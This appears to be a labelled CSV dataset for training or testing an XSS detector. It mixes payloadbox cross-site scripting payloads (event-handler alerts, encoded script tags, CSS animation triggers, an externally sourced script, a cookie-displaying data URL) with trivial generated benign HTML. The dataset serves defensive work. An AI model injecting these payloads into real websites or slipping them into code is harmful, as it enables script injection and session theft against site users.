text,label,source,length,timestamp
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",1,payloadbox,99,2026-02-09T15:05:27.724768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.741766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.738766
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",1,payloadbox,93,2026-02-09T15:05:27.722765
<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,1,payloadbox,68,2026-02-09T15:05:27.715767
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,1,payloadbox,53,2026-02-09T15:05:27.717767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.736778
<span class='class-5474'>Services</span>,0,generated,40,2026-02-09T15:05:27.741766
"<picture draggable=""true"" ondragstart=""alert(1)"">test</picture>",1,payloadbox,63,2026-02-09T15:05:27.719771
"<li draggable=""true"" ondragleave=""alert(1)"">test</li>",1,payloadbox,53,2026-02-09T15:05:27.718768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.743765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.728766
"<datalist draggable=""true"" ondragleave=""alert(1)"">test</datalist>",1,payloadbox,65,2026-02-09T15:05:27.715767
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>,1,payloadbox,54,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.727768
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.727768
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",1,payloadbox,105,2026-02-09T15:05:27.716766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,1,payloadbox,53,2026-02-09T15:05:27.724768
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",1,payloadbox,61,2026-02-09T15:05:27.721766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
"<s onmouseenter=""alert(1)"">test</s>",1,payloadbox,35,2026-02-09T15:05:27.720768
"<menu draggable=""true"" ondragstart=""alert(1)"">test</menu>",1,payloadbox,57,2026-02-09T15:05:27.718768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.737767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.726766
"<script oncontextmenu=""alert(1)"">test</script>",1,payloadbox,46,2026-02-09T15:05:27.720768
<svg><mark onload=alert(1)></mark>,1,payloadbox,34,2026-02-09T15:05:27.723765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.740766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.737767
"<dl onkeyup=""alert(1)"" contenteditable>test</dl>",1,payloadbox,48,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.734777
<span class='class-1224'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
<span class='class-1294'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",1,payloadbox,52,2026-02-09T15:05:27.720768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.742765
"<meta draggable=""true"" ondragleave=""alert(1)"">test</meta>",1,payloadbox,57,2026-02-09T15:05:27.718768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.740766
<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,1,payloadbox,53,2026-02-09T15:05:27.716766
"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>",1,payloadbox,115,2026-02-09T15:05:27.716766
"<html onmouseout=""alert(1)"">test</html>",1,payloadbox,39,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.733766
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",1,payloadbox,101,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
<span class='class-1544'>Services</span>,0,generated,40,2026-02-09T15:05:27.729765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.742765
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",1,payloadbox,111,2026-02-09T15:05:27.721766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.731765
"<button onmouseover=""alert(1)"">test</button>",1,payloadbox,44,2026-02-09T15:05:27.715767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
"<div id=""96""><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",1,payloadbox,79,2026-02-09T15:05:27.725769
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.741766
"<samp onmouseup=""alert(1)"">test</samp>",1,payloadbox,38,2026-02-09T15:05:27.720768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.738766
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",1,payloadbox,60,2026-02-09T15:05:27.719771
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.741766
<svg><details onload=alert(1)></details>,1,payloadbox,40,2026-02-09T15:05:27.723765
"<multicol onmousemove=""alert(1)"">test</multicol>",1,payloadbox,48,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.735774
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionend=alert(1)></span>",1,payloadbox,106,2026-02-09T15:05:27.721766
"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",1,payloadbox,132,2026-02-09T15:05:27.721766
<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>,1,payloadbox,58,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",1,payloadbox,60,2026-02-09T15:05:27.721766
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",1,payloadbox,63,2026-02-09T15:05:27.714766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.734777
"<small onkeydown=""alert(1)"" contenteditable>test</small>",1,payloadbox,56,2026-02-09T15:05:27.720768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.725769
"<caption onmouseup=""alert(1)"">test</caption>",1,payloadbox,44,2026-02-09T15:05:27.715767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
"<noembed onmouseup=""alert(1)"">test</noembed>",1,payloadbox,44,2026-02-09T15:05:27.719771
"<bdo oncontextmenu=""alert(1)"">test</bdo>",1,payloadbox,40,2026-02-09T15:05:27.714766
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>,1,payloadbox,70,2026-02-09T15:05:27.719771
"<legend draggable=""true"" ondrag=""alert(1)"">test</legend>",1,payloadbox,56,2026-02-09T15:05:27.718768
<svg><rp onload=alert(1)></rp>,1,payloadbox,30,2026-02-09T15:05:27.723765
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,1,payloadbox,71,2026-02-09T15:05:27.719771
<x contenteditable onkeyup=alert(1)>press any key!,1,payloadbox,50,2026-02-09T15:05:27.713767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.726766
<x ondblclick=alert(1)>double click this!,1,payloadbox,41,2026-02-09T15:05:27.713767
"<image onbeforecut=""alert(1)"" contenteditable>test</image>",1,payloadbox,58,2026-02-09T15:05:27.717767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.733766
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",1,payloadbox,68,2026-02-09T15:05:27.723765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
"<head onbeforepaste=""alert(1)"" contenteditable>test</head>",1,payloadbox,58,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
"<caption oncontextmenu=""alert(1)"">test</caption>",1,payloadbox,48,2026-02-09T15:05:27.715767
<samp id=x tabindex=1 onfocus=alert(1)></samp>,1,payloadbox,46,2026-02-09T15:05:27.720768
"<ol draggable=""true"" ondragleave=""alert(1)"">test</ol>",1,payloadbox,53,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.742765
"<picture draggable=""true"" ondragleave=""alert(1)"">test</picture>",1,payloadbox,63,2026-02-09T15:05:27.719771
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.728766
<span class='class-5814'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
"<template onkeydown=""alert(1)"" contenteditable>test</template>",1,payloadbox,62,2026-02-09T15:05:27.723765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
<listing id=x tabindex=1 onactivate=alert(1)></listing>,1,payloadbox,55,2026-02-09T15:05:27.718768
"feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>",1,payloadbox,140,2026-02-09T15:05:27.725769
"<rp onmousedown=""alert(1)"">test</rp>",1,payloadbox,36,2026-02-09T15:05:27.720768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.740766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.735774
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",1,payloadbox,104,2026-02-09T15:05:27.721766
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>",1,payloadbox,105,2026-02-09T15:05:27.716766
"<style oncopy=""alert(1)"" contenteditable>test</style>",1,payloadbox,53,2026-02-09T15:05:27.721766
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,1,payloadbox,54,2026-02-09T15:05:27.714766
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>,1,payloadbox,68,2026-02-09T15:05:27.714766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.729765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.728766
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,1,payloadbox,49,2026-02-09T15:05:27.723765
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.721766
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",1,payloadbox,53,2026-02-09T15:05:27.723765
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",1,payloadbox,107,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.732765
"<noscript draggable=""true"" ondragstart=""alert(1)"">test</noscript>",1,payloadbox,65,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
"<head onmousedown=""alert(1)"">test</head>",1,payloadbox,40,2026-02-09T15:05:27.717767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.734777
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",1,payloadbox,107,2026-02-09T15:05:27.716766
"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",1,payloadbox,56,2026-02-09T15:05:27.724768
"<video ondblclick=""alert(1)"">test</video>",1,payloadbox,41,2026-02-09T15:05:27.724768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.742765
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationend=""alert(1)""></shadow>",1,payloadbox,97,2026-02-09T15:05:27.722765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.735774
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.734777
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",1,payloadbox,158,2026-02-09T15:05:27.721766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.742765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.728766
"<body><a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",1,payloadbox,68,2026-02-09T15:05:27.725769
"<div id=""115""><!--[if]><script>alert(115)</script -->",1,payloadbox,53,2026-02-09T15:05:27.725769
"<dd oncontextmenu=""alert(1)"">test</dd>",1,payloadbox,38,2026-02-09T15:05:27.715767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.728766
"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",1,payloadbox,58,2026-02-09T15:05:27.714766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>,1,payloadbox,51,2026-02-09T15:05:27.716766
"<data onmouseover=""alert(1)"">test</data>",1,payloadbox,40,2026-02-09T15:05:27.715767
"<html onkeydown=""alert(1)"" contenteditable>test</html>",1,payloadbox,54,2026-02-09T15:05:27.717767
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",1,payloadbox,56,2026-02-09T15:05:27.714766
"<a onmouseleave=""alert(1)"">test</a>",1,payloadbox,35,2026-02-09T15:05:27.714766
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>,1,payloadbox,72,2026-02-09T15:05:27.720768
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",1,payloadbox,52,2026-02-09T15:05:27.723765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.741766
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",1,payloadbox,180,2026-02-09T15:05:27.722765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
"<noembed draggable=""true"" ondrag=""alert(1)"">test</noembed>",1,payloadbox,58,2026-02-09T15:05:27.719771
"<dl onmouseenter=""alert(1)"">test</dl>",1,payloadbox,37,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",1,payloadbox,117,2026-02-09T15:05:27.716766
"<element oncut=""alert(1)"" contenteditable>test</element>",1,payloadbox,56,2026-02-09T15:05:27.716766
"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",1,payloadbox,61,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.741766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.728766
"<caption onpaste=""alert(1)"" contenteditable>test</caption>",1,payloadbox,58,2026-02-09T15:05:27.715767
"<param onclick=""alert(1)"">test</param>",1,payloadbox,38,2026-02-09T15:05:27.719771
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",1,payloadbox,113,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.738766
"<frame onkeyup=""alert(1)"" contenteditable>test</frame>",1,payloadbox,54,2026-02-09T15:05:27.717767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.735774
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.734777
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.729765
"<select oncontextmenu=""alert(1)"">test</select>",1,payloadbox,46,2026-02-09T15:05:27.720768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.733766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.731765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.732765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.733766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.739765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.726766
"<style>:target {transform: rotate(180deg);}</style><s id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></s>",1,payloadbox,120,2026-02-09T15:05:27.721766
"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",1,payloadbox,86,2026-02-09T15:05:27.725769
"<ruby onclick=""alert(1)"">test</ruby>",1,payloadbox,36,2026-02-09T15:05:27.720768
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",1,payloadbox,93,2026-02-09T15:05:27.722765
<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,1,payloadbox,75,2026-02-09T15:05:27.718768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.735774
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.738766
"<address onclick=""alert(1)"">test</address>",1,payloadbox,42,2026-02-09T15:05:27.714766
<span class='class-3924'>Services</span>,0,generated,40,2026-02-09T15:05:27.736778
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.735774
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",1,payloadbox,115,2026-02-09T15:05:27.721766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.732765
<span class='class-644'>Services</span>,0,generated,39,2026-02-09T15:05:27.727768
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.729765
"<track onbeforecopy=""alert(1)"" contenteditable>test</track>",1,payloadbox,59,2026-02-09T15:05:27.723765
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1,payloadbox,51,2026-02-09T15:05:27.724768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.741766
"<h1 onmouseup=""alert(1)"">test</h1>",1,payloadbox,34,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.733766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.727768
